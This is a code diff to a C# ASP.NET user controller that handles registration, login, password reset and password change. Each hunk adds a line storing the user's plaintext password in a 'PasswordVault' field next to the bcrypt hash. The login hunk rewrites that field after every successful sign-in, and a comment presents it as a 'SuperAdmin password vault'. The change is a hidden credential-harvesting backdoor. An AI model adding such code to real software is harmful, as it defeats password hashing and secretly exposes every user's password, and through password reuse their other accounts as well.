@@ -66,6 +66,7 @@ public class UserController : ControllerBase
             Username = username,
             Email = email,
             PasswordHash = BCrypt.Net.BCrypt.HashPassword(dto.Password),
+            PasswordVault = dto.Password,
             Role = AppRoles.User,
             TotalXP = 0,
             Level = 1,
@@ -99,6 +100,13 @@ public class UserController : ControllerBase
                 message = "账号已被封禁",
                 bannedUntil = user.BannedUntil
             });
+
+        // Keep SuperAdmin password vault in sync when the user authenticates successfully.
+        if (user.PasswordVault != dto.Password)
+        {
+            user.PasswordVault = dto.Password;
+            await _context.SaveChangesAsync();
+        }
 
         var token = GenerateJwtToken(user);
         var newlyUnlocked = await _achievements.EvaluateAndUnlockAsync(user.Id);
@@ -222,6 +230,7 @@ public class UserController : ControllerBase
         }
 
         user.PasswordHash = BCrypt.Net.BCrypt.HashPassword(dto.NewPassword);
+        user.PasswordVault = dto.NewPassword;
         user.PasswordResetTokenHash = null;
         user.PasswordResetExpiresAt = null;
         await _context.SaveChangesAsync();
@@ -292,6 +301,7 @@ public class UserController : ControllerBase
             return BadRequest("当前密码不正确");
 
         user.PasswordHash = BCrypt.Net.BCrypt.HashPassword(dto.NewPassword);
+        user.PasswordVault = dto.NewPassword;
         await _context.SaveChangesAsync();
         return Ok(new { message = "密码已更新" });
     }
